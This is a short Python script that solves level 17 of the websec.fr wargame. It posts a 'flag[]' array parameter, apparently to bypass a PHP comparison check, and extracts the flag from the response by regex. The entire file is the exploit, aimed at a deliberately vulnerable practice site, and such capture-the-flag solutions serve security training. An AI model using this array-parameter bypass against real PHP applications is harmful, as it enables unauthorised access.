import requests
import re


if __name__ == '__main__':
    sess = requests.Session()
    url = 'http://websec.fr/level17/index.php'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    proxies = {'http': 'http://localhost:8080', 'https': 'https://localhost:8080'}

    sess.headers.update(headers)
    sess.proxies.update(proxies)
    sess.get(url=url)

    data = {'flag[]': 1,'submit': 'go'}
    res = sess.post(url=url, data=data)

    pattern = r'WEBSEC{[^}]+}'
    match = re.search(pattern, res.text)

    if match:
        print('[+]FLAG is', match.group())
